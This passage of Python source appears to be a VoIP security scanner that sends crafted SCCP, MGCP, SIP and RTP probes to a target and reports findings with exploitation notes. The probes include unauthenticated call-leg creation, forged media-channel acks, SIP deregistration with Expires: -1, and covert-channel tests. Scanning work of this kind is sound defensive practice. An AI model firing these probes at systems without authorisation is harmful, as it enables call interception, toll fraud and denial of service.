    # Probe 3: OpenReceiveChannelAck (0x0022) without prior OpenReceiveChannel
    # A legitimate OpenReceiveChannelAck is sent by the phone after the
    # call agent sends OpenReceiveChannel (0x0105). Sending the Ack first,
    # unsolicited, tests whether the server binds an RTP listener — RTP hijack.
    # Payload: passThruPartyID(4), ipAddr(4), port(4), ssType(4), ms(4), pktsPerPkt(4)
    # ------------------------------------------------------------------
    orca_payload = struct.pack('<IIIIII',
                               0xDEADBEEF,      # passThruPartyID (arbitrary)
                               struct.unpack('>I', socket.inet_aton('127.0.0.1'))[0],
                               12345,           # RTP port the "phone" claims to open
                               0,               # ssType
                               20,              # ms per packet
                               1)               # pkts per pkt
    orca_msg = _sccp_frame(0x0022, orca_payload)
    resp3 = _sccp_connect_send_recv(orca_msg)

    if resp3 and len(resp3) >= 12:
        findings.append({
            'severity': 'HIGH',
            'title': 'SCCP_UNSOLICITED_MEDIA_CHANNEL',
            'detail': (
                f'TCP {host}:{port} returned {len(resp3)} bytes in response '
                f'to an unsolicited SCCP OpenReceiveChannelAck (0x0022) — '
                f'sent without a preceding OpenReceiveChannel (0x0105) from '
                f'the call agent. The server processed the message and replied, '
                f'indicating the call agent accepted an attacker-controlled '
                f'RTP endpoint description. This enables RTP stream hijacking: '
                f'an attacker substitutes their IP/port in the media channel '
                f'negotiation to redirect audio to an attacker-controlled host '
                f'(ch13: SCCP media channel hijack, OpenReceiveChannelAck '
                f'without prior OpenReceiveChannel; ASA SCCP inspection gap).'
            ),
            'host': host,
            'port': port,
        })

    return findings


def detect_mgcp_surface(host, port=2427, timeout=5.0):
    """Probe MGCP inspection bypass conditions on UDP/2427.

    Covers:
      - AUEP (Audit Endpoint): wildcard endpoint audit without authentication
      - RQNT (Request Notify): wildcard notify subscription
      - CRCX (Create Connection): unauthenticated call leg creation

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    def _mgcp_probe(command_str):
        """Send MGCP command string over UDP, return response bytes."""
        resp = b''
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(command_str.encode(), (host, port))
            try:
                data, _ = s.recvfrom(4096)
                resp = data
            except socket.timeout:
                pass
            s.close()
        except OSError:
            pass
        return resp

    def _mgcp_response_code(resp_bytes):
        """Extract integer response code from first line of MGCP response."""
        try:
            first_line = resp_bytes.decode(errors='replace').split('\n')[0].strip()
            parts = first_line.split()
            if parts:
                return int(parts[0])
        except (ValueError, IndexError):
            pass
        return None

    # ------------------------------------------------------------------
    # Probe 1: AUEP — Audit Endpoint (wildcard)
    # MGCP 1.0 §3.2.2: AUEP requests capabilities/state of an endpoint.
    # Wildcard (*@host) should require CallAgent authentication.
    # 200 = CRITICAL unauthenticated endpoint audit.
    # ------------------------------------------------------------------
    auep_cmd = f'AUEP 1234 *@{host} MGCP 1.0\r\n\r\n'
    resp_auep = _mgcp_probe(auep_cmd)
    if resp_auep:
        code = _mgcp_response_code(resp_auep)
        if code is not None and 200 <= code < 300:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'MGCP_ENDPOINT_AUDIT_UNAUTH',
                'detail': (
                    f'UDP {host}:{port} returned MGCP {code} to an AUEP '
                    f'(Audit Endpoint) command targeting wildcard endpoint '
                    f'*@{host} with no CallAgent authentication. Full endpoint '
                    f'capability and state disclosure is available to any '
                    f'unauthenticated sender. An attacker can enumerate all '
                    f'media gateway endpoints, their connection state, codec '
                    f'configurations, and signaling parameters — prerequisite '
                    f'intelligence for targeted call interception or gateway '
                    f'disruption (ch13: MGCP inspection, AUEP wildcard, '
                    f'UDP/2427 unauthenticated endpoint audit; RFC 3435 §3.2.2).'
                ),
                'host': host,
                'port': port,
            })
        elif code is not None:
            # Any numeric response = MGCP is listening
            findings.append({
                'severity': 'INFO',
                'title': 'MGCP_SURFACE_OPEN',
                'detail': (
                    f'UDP {host}:{port} responded to MGCP AUEP with code {code}. '
                    f'MGCP service is reachable. Further probing with '
                    f'authenticated commands may reveal additional endpoints '
                    f'(ch13: MGCP inspection surface, UDP/2427).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 2: RQNT — Request Notify (wildcard endpoint, no auth)
    # Requests that the gateway notify the CallAgent of a specific event.
    # Acceptance without auth = event subscription hijack.
    # ------------------------------------------------------------------
    rqnt_cmd = f'RQNT 1235 *@{host} MGCP 1.0\r\n\r\n'
    resp_rqnt = _mgcp_probe(rqnt_cmd)
    if resp_rqnt:
        code = _mgcp_response_code(resp_rqnt)
        if code is not None and 200 <= code < 300:
            findings.append({
                'severity': 'HIGH',
                'title': 'MGCP_NOTIFY_ACCEPTED',
                'detail': (
                    f'UDP {host}:{port} returned MGCP {code} to an RQNT '
                    f'(Request Notify) command targeting wildcard endpoint '
                    f'*@{host} without authentication. An unauthenticated '
                    f'caller can subscribe to gateway events (off-hook, '
                    f'on-hook, DTMF, fax tones) — enabling passive call '
                    f'monitoring and DTMF capture without being present in '
                    f'the media path. ASA MGCP inspection must validate that '
                    f'RQNT originates from the registered CallAgent '
                    f'(ch13: MGCP notify hijack, RQNT unauthenticated, '
                    f'UDP/2427; RFC 3435 §3.2.5).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 3: CRCX — Create Connection (no CallAgent auth)
    # Instructs gateway to create a connection (call leg) and allocate RTP.
    # 200 = CRITICAL — attacker can instantiate calls against the gateway.
    # ------------------------------------------------------------------
    crcx_cmd = (
        f'CRCX 1236 *@{host} MGCP 1.0\r\n'
        f'C: 1234\r\n'
        f'M: recvonly\r\n'
        f'\r\n'
    )
    resp_crcx = _mgcp_probe(crcx_cmd)
    if resp_crcx:
        code = _mgcp_response_code(resp_crcx)
        if code is not None and 200 <= code < 300:
            findings.append({
                'severity': 'CRITICAL',
                'title': 'MGCP_CALL_CREATED_UNAUTH',
                'detail': (
                    f'UDP {host}:{port} returned MGCP {code} to a CRCX '
                    f'(Create Connection) command without CallAgent '
                    f'authentication, call ID 1234, mode recvonly. The media '
                    f'gateway allocated a call leg and is ready to accept RTP '
                    f'media — without any authorization check. An attacker can '
                    f'instantiate arbitrary call connections on the gateway, '
                    f'consume TDM/DS0 resources to exhaustion, intercept media '
                    f'streams, and pivot to toll fraud by bridging external '
                    f'PSTN calls. ASA MGCP inspection must restrict CRCX to '
                    f'the provisioned CallAgent address '
                    f'(ch13: MGCP unauthenticated CRCX, call creation, '
                    f'UDP/2427 toll-fraud surface; RFC 3435 §3.2.3).'
                ),
                'host': host,
                'port': port,
            })

    return findings


def probe_asa_sip_fixup_legacy(host, port=5060, timeout=5.0):
    """Probe ASA SIP fixup/normalization bypass conditions.

    Covers:
      - SIP INVITE with Request-URI lacking sip: scheme (bare host)
      - SIP Via header containing TEST-NET IP (192.0.2.1, RFC 5737)
      - SIP Content-Length: 0 with non-empty body
      - SIP REGISTER with Expires: -1 (negative)

    Returns list of {severity, title, detail, host, port}.
    """
    findings = []

    def _sip_send_recv_udp(msg_bytes):
        """Send SIP message over UDP, return response bytes."""
        resp = b''
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(msg_bytes, (host, port))
            try:
                data, _ = s.recvfrom(8192)
                resp = data
            except socket.timeout:
                pass
            s.close()
        except OSError:
            pass
        return resp

    def _sip_response_code(resp_bytes):
        """Extract integer SIP response code from first line."""
        try:
            first_line = resp_bytes.decode(errors='replace').split('\n')[0].strip()
            if first_line.startswith('SIP/'):
                parts = first_line.split()
                if len(parts) >= 2:
                    return int(parts[1])
        except (ValueError, IndexError):
            pass
        return None

    import time as _time
    call_id_base = f'{int(_time.time())}'

    # ------------------------------------------------------------------
    # Probe 1: INVITE with Request-URI lacking sip: scheme (bare host)
    # RFC 3261 §8.1.1.1: Request-URI MUST use the sip: or sips: URI scheme.
    # ASA SIP fixup/normalization should reject non-URI request targets.
    # If the server returns 200 or processes the request = bypass.
    # ------------------------------------------------------------------
    bare_uri_invite = (
        f'INVITE {host} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-fixup-01\r\n'
        f'From: "Ablation" <sip:ablation@10.0.0.1>;tag=fixup01\r\n'
        f'To: <sip:target@{host}>\r\n'
        f'Call-ID: fixup-bare-uri-{call_id_base}@ablation\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'Contact: <sip:ablation@10.0.0.1>\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Max-Forwards: 1\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    ).encode()

    resp1 = _sip_send_recv_udp(bare_uri_invite)
    if resp1:
        code1 = _sip_response_code(resp1)
        # Any 1xx or 2xx = processed (not rejected for malformed URI)
        if code1 is not None and code1 < 400:
            findings.append({
                'severity': 'HIGH',
                'title': 'SIP_FIXUP_SCHEME_BYPASS',
                'detail': (
                    f'UDP {host}:{port} returned SIP {code1} to an INVITE '
                    f'with a bare-host Request-URI ("{host}") lacking the '
                    f'"sip:" scheme prefix. RFC 3261 §8.1.1.1 requires a '
                    f'valid SIP URI in the Request-URI; the ASA SIP fixup/'
                    f'normalization engine should reject this message. '
                    f'Acceptance indicates normalization is absent or '
                    f'misconfigured — attackers can send malformed SIP '
                    f'requests that downstream proxies and UAs may handle '
                    f'inconsistently, enabling request-routing manipulation '
                    f'and ALG state desynchronization '
                    f'(ch13: ASA SIP fixup legacy mode, Request-URI '
                    f'normalization bypass; RFC 3261 §8.1.1.1).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 2: SIP Via with TEST-NET source IP (192.0.2.1, RFC 5737)
    # A Via header containing 192.0.2.1 should not be routable.
    # ASA SIP fixup should rewrite Via headers for NAT. If the response
    # echoes 192.0.2.1 back unchanged, the ALG did not rewrite it —
    # Via spoofing passed through inspection.
    # ------------------------------------------------------------------
    via_spoof_options = (
        f'OPTIONS sip:{host} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP 192.0.2.1:5060;branch=z9hG4bK-via-spoof-01\r\n'
        f'From: "Ablation" <sip:ablation@192.0.2.1>;tag=viaspoof01\r\n'
        f'To: <sip:{host}>\r\n'
        f'Call-ID: fixup-via-spoof-{call_id_base}@ablation\r\n'
        f'CSeq: 1 OPTIONS\r\n'
        f'Contact: <sip:ablation@192.0.2.1>\r\n'
        f'Max-Forwards: 1\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    ).encode()

    resp2 = _sip_send_recv_udp(via_spoof_options)
    if resp2:
        resp2_str = resp2.decode(errors='replace')
        # If 192.0.2.1 appears in the response Via, it was echoed back unchanged
        if '192.0.2.1' in resp2_str:
            findings.append({
                'severity': 'HIGH',
                'title': 'SIP_VIA_SPOOFING_PASSED',
                'detail': (
                    f'UDP {host}:{port} echoed the TEST-NET address 192.0.2.1 '
                    f'(RFC 5737) in the Via header of the SIP response without '
                    f'rewriting it. ASA SIP fixup for NAT traversal should '
                    f'rewrite Via headers to replace private/spoofed addresses '
                    f'with the public-facing address. An attacker behind NAT '
                    f'can insert arbitrary IP addresses in Via headers to '
                    f'redirect SIP responses to a controlled host — enabling '
                    f'SIP response hijacking and call interception '
                    f'(ch13: ASA SIP NAT fixup, Via header rewrite bypass; '
                    f'RFC 3261 §18.2.2, RFC 5737).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 3: Content-Length: 0 with non-empty body
    # RFC 3261 §20.14: Content-Length MUST accurately reflect body length.
    # ASA SIP normalization should reject or correct this mismatch.
    # If the server accepts (2xx/1xx) = Content-Length bypass.
    # ------------------------------------------------------------------
    sdp_body = (
        'v=0\r\n'
        'o=ablation 0 0 IN IP4 10.0.0.1\r\n'
        's=-\r\n'
        'c=IN IP4 10.0.0.1\r\n'
        't=0 0\r\n'
        'm=audio 10000 RTP/AVP 0\r\n'
    )
    cl_zero_invite = (
        f'INVITE sip:target@{host} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-clzero-01\r\n'
        f'From: "Ablation" <sip:ablation@10.0.0.1>;tag=clzero01\r\n'
        f'To: <sip:target@{host}>\r\n'
        f'Call-ID: fixup-cl-zero-{call_id_base}@ablation\r\n'
        f'CSeq: 1 INVITE\r\n'
        f'Contact: <sip:ablation@10.0.0.1>\r\n'
        f'Content-Type: application/sdp\r\n'
        f'Max-Forwards: 1\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
        + sdp_body
    ).encode()

    resp3 = _sip_send_recv_udp(cl_zero_invite)
    if resp3:
        code3 = _sip_response_code(resp3)
        # 1xx (trying/ringing) or 2xx = server parsed the body despite CL=0
        if code3 is not None and code3 < 400:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SIP_CONTENT_LENGTH_BYPASS',
                'detail': (
                    f'UDP {host}:{port} returned SIP {code3} to an INVITE '
                    f'with Content-Length: 0 and a non-empty SDP body '
                    f'({len(sdp_body)} bytes). The server processed the SDP '
                    f'body despite the declared zero length — indicating the '
                    f'ASA SIP normalization engine did not enforce Content-Length '
                    f'accuracy. This mismatch can desynchronize IDS/IPS '
                    f'inspection from the actual message payload, hiding '
                    f'malicious SDP content (e.g., injected media IP/port) '
                    f'from signature-based detection '
                    f'(ch13: ASA SIP normalization, Content-Length '
                    f'enforcement bypass; RFC 3261 §20.14).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 4: REGISTER with Expires: -1 (negative value)
    # RFC 3261 §20.19: Expires header MUST be a non-negative integer.
    # Some implementations interpret negative Expires as immediate
    # deregistration without validating the Contact binding.
    # Accepted = deregistration bypass / registration state manipulation.
    # ------------------------------------------------------------------
    neg_expires_register = (
        f'REGISTER sip:{host} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-negexp-01\r\n'
        f'From: "Ablation" <sip:ablation@10.0.0.1>;tag=negexp01\r\n'
        f'To: <sip:ablation@{host}>\r\n'
        f'Call-ID: fixup-neg-exp-{call_id_base}@ablation\r\n'
        f'CSeq: 1 REGISTER\r\n'
        f'Contact: <sip:ablation@10.0.0.1>\r\n'
        f'Expires: -1\r\n'
        f'Max-Forwards: 1\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    ).encode()

    resp4 = _sip_send_recv_udp(neg_expires_register)
    if resp4:
        code4 = _sip_response_code(resp4)
        if code4 is not None and 200 <= code4 < 300:
            findings.append({
                'severity': 'HIGH',
                'title': 'SIP_NEGATIVE_EXPIRES_ACCEPTED',
                'detail': (
                    f'UDP {host}:{port} returned SIP {code4} to a REGISTER '
                    f'request with Expires: -1. RFC 3261 §20.19 requires '
                    f'Expires to be a non-negative integer; a value of -1 is '
                    f'invalid. The registrar accepted the negative Expires '
                    f'value without rejecting the request — enabling '
                    f'deregistration bypass: an attacker can deregister a '
                    f'legitimate endpoint without knowing its credentials by '
                    f'sending a REGISTER with Expires: -1 matching the '
                    f'target AOR. The victim phone loses its registration '
                    f'and cannot receive calls until it re-registers '
                    f'(ch13: ASA SIP normalization, negative Expires '
                    f'deregistration bypass; RFC 3261 §20.19).'
                ),
                'host': host,
                'port': port,
            })

    return findings


# ---------------------------------------------------------------------------
# Covert channel detection — SIP signaling plane
# ---------------------------------------------------------------------------

def detect_voip_covert_channel(host, port=5060, timeout=5.0):
    """Detect covert channel surfaces in SIP signaling.

    Probes:
      - SIP server responsiveness via OPTIONS (baseline liveness)
      - Allow header advertising PUBLISH/NOTIFY without subscription dialog
        (RFC 3903/RFC 3265 abuse — out-of-dialog event body transport)
      - SIP MESSAGE with Content-Type: application/octet-stream body
        (binary data transport through SIP; exfiltration channel)
      - SIP over TCP on port 5060 (persistent covert signaling channel)

    Covert channel concept grounded in PMA ch12 (covert malware launching:
    execution injected into asynchronous queues that stateful inspection does
    not track; APC injection analogy for out-of-dialog SIP bodies) and PMA
    ch14 (protocol tunneling — embedding data in fields the receiver does not
    validate, User-Agent encoding, DNS tunneling; direct analogy to binary
    bodies in SIP MESSAGE and data in NOTIFY Event bodies).

    Returns list of {severity, title, detail, host, port}.
    """
    import time as _time
    findings = []

    call_id_base = str(int(_time.time()))

    def _udp_send_recv(msg_bytes):
        resp = b''
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(msg_bytes, (host, port))
            try:
                data, _ = s.recvfrom(8192)
                resp = data
            except socket.timeout:
                pass
            s.close()
        except OSError:
            pass
        return resp

    def _parse_code(resp_bytes):
        try:
            line = resp_bytes.decode(errors='replace').split('\n')[0].strip()
            if line.startswith('SIP/'):
                parts = line.split()
                if len(parts) >= 2:
                    return int(parts[1])
        except (ValueError, IndexError):
            pass
        return None

    def _parse_hdr(resp_bytes, name):
        try:
            text = resp_bytes.decode(errors='replace')
            low = name.lower() + ':'
            for line in text.splitlines():
                if line.lower().startswith(low):
                    return line[len(name) + 1:].strip()
        except Exception:
            pass
        return ''

    # ------------------------------------------------------------------
    # Probe 1: SIP OPTIONS — server liveness and Allow header harvest
    # RFC 3261 §11: OPTIONS queries server capabilities; Allow header
    # lists supported methods. Responsive server = active probe surface.
    # ------------------------------------------------------------------
    options_msg = (
        f'OPTIONS sip:{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-cov-opt-01\r\n'
        f'From: "Ablation" <sip:ablation@10.0.0.1>;tag=covopt01\r\n'
        f'To: <sip:{host}>\r\n'
        f'Call-ID: covert-opt-{call_id_base}@ablation\r\n'
        f'CSeq: 1 OPTIONS\r\n'
        f'Max-Forwards: 10\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    ).encode()

    resp1 = _udp_send_recv(options_msg)
    if resp1:
        code1 = _parse_code(resp1)
        if code1 is not None:
            findings.append({
                'severity': 'INFO',
                'title': 'SIP_SERVER_RESPONSIVE',
                'detail': (
                    f'UDP {host}:{port} returned SIP {code1} to OPTIONS. '
                    f'Server is alive and processing SIP signaling. '
                    f'Active covert channel surface probes follow '
                    f'(RFC 3261 §11).'
                ),
                'host': host,
                'port': port,
            })

            # ------------------------------------------------------------------
            # Probe 2: Allow header — PUBLISH or NOTIFY without subscription
            # RFC 3903: PUBLISH transports event state; RFC 3265: NOTIFY is
            # issued within a SUBSCRIBE dialog. Either listed in Allow without
            # a prior dialog = out-of-dialog event body accepted.
            # Stateful SIP firewalls track INVITE/200/BYE sessions; a NOTIFY
            # or PUBLISH arriving outside that state machine is invisible to
            # call-leg-stateful inspection — the body traverses unchecked.
            # PMA ch12 (APC injection): code queued to a thread the inspector
            # does not monitor. Out-of-dialog NOTIFY body = data injected
            # into an asynchronous event queue outside the SIP dialog tracker.
            # ------------------------------------------------------------------
            allow_hdr = _parse_hdr(resp1, 'Allow')
            allow_methods = [m.strip().upper() for m in allow_hdr.split(',')]
            surface_methods = [m for m in ('PUBLISH', 'NOTIFY')
                               if m in allow_methods]
            if surface_methods:
                findings.append({
                    'severity': 'HIGH',
                    'title': 'SIP_COVERT_CHANNEL_SURFACE',
                    'detail': (
                        f'UDP {host}:{port} advertises '
                        f'{", ".join(surface_methods)} in the Allow header '
                        f'without requiring a prior subscription dialog. '
                        f'RFC 3903 PUBLISH and RFC 3265 NOTIFY both carry '
                        f'arbitrary application/xml or PIDF+XML bodies. '
                        f'Out-of-dialog use bypasses call-leg-stateful SIP '
                        f'inspection: a firewall tracking INVITE/200/BYE '
                        f'sessions will not associate a standalone NOTIFY '
                        f'with any call, leaving its body uninspected. '
                        f'Analogous to APC injection (PMA ch12): execution '
                        f'queued into a thread queue that the stateful '
                        f'inspector does not track — the NOTIFY body is '
                        f'the "APC function," the dialog-less path is the '
                        f'"alertable thread." An attacker exfiltrates data '
                        f'in NOTIFY Event: presence bodies across SIP trunks '
                        f'that pass signaling but apply no content inspection '
                        f'(RFC 3903 §5; RFC 3265 §3.2).'
                    ),
                    'host': host,
                    'port': port,
                })

    # ------------------------------------------------------------------
    # Probe 3: SIP MESSAGE with Content-Type: application/octet-stream
    # RFC 3428: MESSAGE method for instant messaging over SIP.
    # octet-stream body = raw binary payload; not expected by SIP proxies
    # inspecting for voice/IM content.
    # PMA ch14 (protocol tunneling): data embedded in protocol fields that
    # the receiver does not validate — User-Agent, GET URI, DNS name fields.
    # Binary body in SIP MESSAGE is the SIP-plane equivalent: a frame that
    # is structurally valid SIP but whose body is an opaque binary blob
    # invisible to text-pattern IDS rules on SIP port 5060.
    # 200/202 response = server acknowledged delivery of binary payload.
    # ------------------------------------------------------------------
    binary_payload = bytes(range(32))  # 32 bytes of detectable binary pattern
    binary_msg = (
        f'MESSAGE sip:probe@{host} SIP/2.0\r\n'
        f'Via: SIP/2.0/UDP 10.0.0.1:5060;branch=z9hG4bK-cov-bin-01\r\n'
        f'From: "Ablation" <sip:ablation@10.0.0.1>;tag=covbin01\r\n'
        f'To: <sip:probe@{host}>\r\n'
        f'Call-ID: covert-bin-{call_id_base}@ablation\r\n'
        f'CSeq: 1 MESSAGE\r\n'
        f'Max-Forwards: 10\r\n'
        f'Content-Type: application/octet-stream\r\n'
        f'Content-Length: {len(binary_payload)}\r\n'
        f'\r\n'
    ).encode() + binary_payload

    resp3 = _udp_send_recv(binary_msg)
    if resp3:
        code3 = _parse_code(resp3)
        if code3 in (200, 202):
            findings.append({
                'severity': 'CRITICAL',
                'title': 'SIP_BINARY_DATA_TRANSPORT',
                'detail': (
                    f'UDP {host}:{port} returned SIP {code3} to a MESSAGE '
                    f'request with Content-Type: application/octet-stream '
                    f'and a raw binary body. The server accepted and '
                    f'acknowledged delivery of arbitrary binary data over '
                    f'the SIP signaling plane. SIP MESSAGE is defined for '
                    f'text content (application/im-iscomposing+xml, '
                    f'text/plain); octet-stream bodies are a protocol '
                    f'tunneling primitive: binary content is not matched by '
                    f'text-pattern IDS signatures on SIP port 5060, and most '
                    f'DPI engines inspecting SIP for voice QoS do not '
                    f'content-inspect MESSAGE bodies. This creates a covert '
                    f'exfiltration channel: binary payloads (encoded keys, '
                    f'memory dumps, C2 beacons) transport inside RFC-compliant '
                    f'SIP MESSAGE frames indistinguishable from legitimate '
                    f'IM traffic at the SIP layer. Direct analogy to '
                    f'User-Agent field encoding (PMA ch14: data embedded in '
                    f'a field the receiver does not validate; PMA ch12 '
                    f'process injection: payload delivered in a protocol '
                    f'frame with no content check; RFC 3428 §8).'
                ),
                'host': host,
                'port': port,
            })

    # ------------------------------------------------------------------
    # Probe 4: SIP over TCP — persistent covert signaling channel
    # RFC 3261 §18.1: SIP defaults to UDP; TCP is used for large messages.
    # TCP provides a persistent connection maintained across requests —
    # not torn down per-transaction — enabling a long-lived covert channel
    # through stateful SIP proxies that track TCP state separately.
    # PMA ch12 (hook injection / detours): code patched into an active
    # execution path that persists after the initial injection. TCP SIP
    # = maintained signaling channel through which C2 frames interleave
    # with SIP re-INVITEs and OPTIONS keepalives, bypassing UDP-only
    # SIP inspection rules (OllyDbg patching analogy: persistence via
    # NOP-patch of a conditional check; PMA ch9 patching).
    # ------------------------------------------------------------------
    tcp_options = (
        f'OPTIONS sip:{host}:{port} SIP/2.0\r\n'
        f'Via: SIP/2.0/TCP 10.0.0.1:5060;branch=z9hG4bK-cov-tcp-01\r\n'
        f'From: "Ablation" <sip:ablation@10.0.0.1>;tag=covtcp01\r\n'
        f'To: <sip:{host}>\r\n'
        f'Call-ID: covert-tcp-{call_id_base}@ablation\r\n'
        f'CSeq: 1 OPTIONS\r\n'
        f'Max-Forwards: 10\r\n'
        f'Content-Length: 0\r\n'
        f'\r\n'
    ).encode()

    tcp_resp = b''
    try:
        ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        ts.settimeout(timeout)
        ts.connect((host, port))
        ts.sendall(tcp_options)
        try:
            chunk = ts.recv(4096)
            tcp_resp = chunk
        except socket.timeout:
            pass
        ts.close()
    except OSError:
        pass

    if tcp_resp:
        tcp_code = _parse_code(tcp_resp)
        if tcp_code is not None:
            findings.append({
                'severity': 'MEDIUM',
                'title': 'SIP_TCP_TRANSPORT',
                'detail': (
                    f'TCP {host}:{port} accepted a SIP OPTIONS request and '
                    f'returned SIP {tcp_code}. The SIP server processes '
                    f'signaling over TCP in addition to (or instead of) UDP. '
                    f'A persistent TCP SIP connection provides a long-lived '
                    f'covert channel: TCP keepalives maintain the socket '
                    f'without SIP-level traffic, defeating UDP-only SIP '
                    f'inspection and per-request stateless firewall rules. '
                    f'A covert operator can interleave C2 frames inside a '
                    f'TCP SIP session established for a legitimate call, '
                    f'hiding payload among SIP re-INVITEs and OPTIONS pings '
                    f'on the same connection. Analogous to detour/hook '
                    f'injection persistence (PMA ch12): a maintained '
                    f'execution path in an existing process that survives '
                    f'call teardown; the TCP SIP socket outlives individual '
                    f'SIP dialogs and carries arbitrary SIP bodies across '
                    f'inspection boundaries (RFC 3261 §18.1.3).'
                ),
                'host': host,
                'port': port,
            })

    return findings


# ---------------------------------------------------------------------------
# Covert channel detection — RTP/RTCP media plane
# ---------------------------------------------------------------------------

def probe_rtp_covert_channel(host, rtp_port=16384, timeout=5.0):
    """Probe RTP/RTCP media path for covert channel surfaces.

    Probes:
      - RTP with dynamic payload type 127 (unregistered PT; opaque body)
      - RTP with SSRC=0x00000000 (invalid SSRC; no demux validation)
      - RTCP APP packet with custom name 'HACK' (unrestricted app data)
      - Oversized RTP packet >1500 bytes (jumbo-frame covert bandwidth)

    RTP/RTCP covert channel analysis grounded in PMA ch14 (protocol field
    abuse for data tunneling: DNS encoding, User-Agent embedding, fields
    not inspected by content-based countermeasures) and PMA ch13 (data
    encoding — encoding algorithms that maximize payload density; custom
    encoding hidden in fields the receiver does not validate). Media paths
    are rarely subject to DPI; dynamic PTs and RTCP APP packets are
    transparent to SBC/firewall content inspection.

    Returns list of {severity, title, detail, host, port}.
    """
    import struct as _struct
    import os as _os
    import time as _time
    findings = []

    def _udp_send_recv(sock_addr, payload, recv_size=1600):
        resp = b''
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(timeout)
            s.sendto(payload, sock_addr)
            try:
                data, _ = s.recvfrom(recv_size)
                resp = data
            except socket.timeout:
                pass
            s.close()
        except OSError:
            pass
        return resp

    def _rtp_header(pt, seq, ts, ssrc):
        """Build minimal 12-byte RTP fixed header (RFC 3550 §5.1).

        Byte 0: V=2|P=0|X=0|CC=0 -> 0x80
        Byte 1: M=0|PT(7bits)
        Bytes 2-3: sequence number (big-endian uint16)
        Bytes 4-7: timestamp (big-endian uint32)
        Bytes 8-11: SSRC (big-endian uint32)
        """
        b0 = 0x80          # V=2, P=0, X=0, CC=0
        b1 = (pt & 0x7F)   # M=0
        return _struct.pack('!BBHII', b0, b1, seq, ts, ssrc)

    ts_base = int(_time.time()) & 0xFFFFFFFF
    seq_base = 1000

    # ------------------------------------------------------------------
    # Probe 1: RTP with payload type 127 (dynamic/unassigned)
    # RFC 3551 Table 5: PT 96-127 = dynamic; PT 127 has no registered
    # codec mapping. An SBC/media server that accepts PT 127 without
    # prior SDP negotiation (m= line with a:rtpmap:127 ...) will forward
    # the payload without codec awareness — the body bytes are treated
    # as opaque audio, creating an unvalidated data channel.
    # PMA ch14: embedding data in a protocol field the receiver does not
    # interpret (DNS tunneling, User-Agent field encoding). PT 127 body
    # = the SDP-layer equivalent: a field value outside the negotiated
    # set that the receiver forwards without content inspection.
    # ------------------------------------------------------------------
    payload1 = (_rtp_header(127, seq_base, ts_base, 0xDEADBEEF)
                + b'\xde\xad\xbe\xef' * 32)
    resp1 = _udp_send_recv((host, rtp_port), payload1)
    if resp1 and len(resp1) >= 4:
        findings.append({
            'severity': 'HIGH',
            'title': 'RTP_DYNAMIC_PT_ACCEPTED',
            'detail': (
                f'UDP {host}:{rtp_port} responded to an RTP packet with '
                f'payload type 127 (dynamic/unassigned per RFC 3551). No '
                f'prior SDP negotiation registered PT 127 via an a:rtpmap '
                f'attribute; the endpoint accepted and processed the packet '
                f'anyway. An attacker can use any unregistered dynamic PT '
                f'(96-127) as a transparent data channel: the media path '
                f'forwards PT-127 frames without codec validation, making '
                f'payload bytes opaque to any content inspection applied to '
                f'known audio codecs (G.711, G.729, Opus). Equivalent to '
                f'embedding data in a protocol field the receiver does not '
                f'interpret (PMA ch14: DNS tunneling via manufactured domain '
                f'names, User-Agent field encoding; RFC 3551 §6; '
                f'RFC 3550 §5.1).'
            ),
            'host': host,
            'port': rtp_port,
        })

    # ------------------------------------------------------------------
    # Probe 2: RTP with SSRC=0x00000000 (invalid stream identifier)
    # RFC 3550 §8: SSRC identifies the synchronization source; zero is
    # not a valid SSRC (collisions trigger SSRC change, but SSRC=0 means
    # "no source"). A server that continues forwarding a zero-SSRC stream
    # has no SSRC validation in the media demuxer: an attacker injects
    # traffic on any port by spoofing SSRC=0 without needing to know
    # the negotiated SSRC from the SDP exchange.
    # PMA ch12 (process injection): write into a target process via an
    # unguarded handle — the injection does not require the handle's
    # identity, only that the target accepts writes. SSRC=0 = injecting
    # into a media stream without the negotiated stream identifier.
    # ------------------------------------------------------------------
    payload2 = (_rtp_header(0, seq_base + 1, ts_base + 160, 0x00000000)
                + b'\x00' * 160)
    resp2 = _udp_send_recv((host, rtp_port), payload2)
    if resp2 and len(resp2) >= 4:
        findings.append({
            'severity': 'HIGH',
            'title': 'RTP_ZERO_SSRC_ACCEPTED',
            'detail': (
                f'UDP {host}:{rtp_port} responded to an RTP packet with '
                f'SSRC=0x00000000. RFC 3550 §8 specifies that SSRC is a '
                f'randomly chosen synchronization source identifier; zero '
                f'is not a valid source. The endpoint accepted the zero-SSRC '
                f'stream without rejection, indicating absent SSRC validation '
                f'in the media demuxer. An attacker can inject media into an '
